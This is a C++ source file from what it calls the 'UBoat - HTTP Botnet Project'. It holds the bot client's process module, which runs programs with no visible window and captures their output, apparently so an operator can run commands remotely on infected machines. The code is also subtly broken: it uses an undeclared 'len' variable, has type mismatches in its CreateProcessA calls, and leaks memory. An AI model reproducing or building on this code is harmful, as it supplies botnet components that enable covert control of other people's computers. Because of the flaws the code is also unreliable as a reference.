/**
 * This file is part of UBoat - HTTP Botnet Project
 */

#include <Windows.h>
#include <stdio.h>

#include "Processes.hpp"

namespace UBoat {
namespace Processes {
    std::string GetResult(const std::string& processName, const std::string& args)
    {
#ifdef _DEBUG_
        std::cout << "Processes::GetResult(`" << processName << "`, `" << args << "`)" << std::endl;
#endif
        char* returnValue = (char*)0;
        int currentSize = 0;
        STARTUPINFOA si;
        PROCESS_INFORMATION pi;

        ZeroMemory(&si, sizeof(si));
        ZeroMemory(&pi, sizeof(pi));

        si.dwFlags = STARTF_USESTDHANDLES;
        si.cb = sizeof(STARTUPINFOA);

        SECURITY_ATTRIBUTES saAttr;
        saAttr.nLength = sizeof(SECURITY_ATTRIBUTES);
        saAttr.bInheritHandle = TRUE;
        saAttr.lpSecurityDescriptor = NULL;

        HANDLE stdOut_read, stdOut_write;
        CreatePipe(&stdOut_read, &stdOut_write, &saAttr, 0);

        HANDLE stdIn_read, stdIn_write;
        CreatePipe(&stdIn_read, &stdIn_write, &saAttr, 0);

        SetHandleInformation(stdOut_read, HANDLE_FLAG_INHERIT, 0);

        SetHandleInformation(stdIn_write, HANDLE_FLAG_INHERIT, 0);

        si.hStdError = stdOut_write;
        si.hStdOutput = stdOut_write;
        si.hStdInput = stdIn_read;

        char* buffer = (char*)malloc(512);
        if (CreateProcessA(processName, args, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            DWORD exitCode;
            do {
                GetExitCodeProcess(pi.hProcess, &exitCode);
            } while (exitCode == STILL_ACTIVE);

            DWORD read;
            while (true) {
                bool bResult = ReadFile(stdOut_read, (LPVOID)buffer, 512, &read, NULL);
                if (read == 0 || !bResult) //hackish, try to resolve later
                    break;

                if (returnValue == 0)
                    returnValue = (char*)malloc(read + 1);
                else
                    returnValue = (char*)realloc(returnValue, read + currentSize + 1);

                returnValue[currentSize + read] = 0;
                memcpy_s(returnValue + currentSize, read, buffer, read);

                currentSize += read;

                if (read < 512)
                    break;
            }
        }

        free(buffer);

        CloseHandle(stdIn_read);
        CloseHandle(stdOut_read);
        CloseHandle(stdIn_write);
        CloseHandle(stdOut_write);

        *len = (returnValue ? currentSize : 25);
        return (returnValue ? returnValue : "Could not start process.");
    }

    bool Start(const std::string& processName, const std::string& args)
    {
#ifdef _DEBUG_
        std::cout << "Processes::Start(`" << processName << "`, `" << args << "`)" << std::endl;
#endif
        char* returnValue = (char*)0;
        STARTUPINFOA si;
        PROCESS_INFORMATION pi;

        ZeroMemory(&si, sizeof(si));
        ZeroMemory(&pi, sizeof(pi));

        si.cb = sizeof(STARTUPINFOA);

        if (CreateProcessA(const_cast<char*>(processName.c_str()), args.c_str(), NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
            return true;
        }

        return false;
    }
} // Processes
} // UBoat
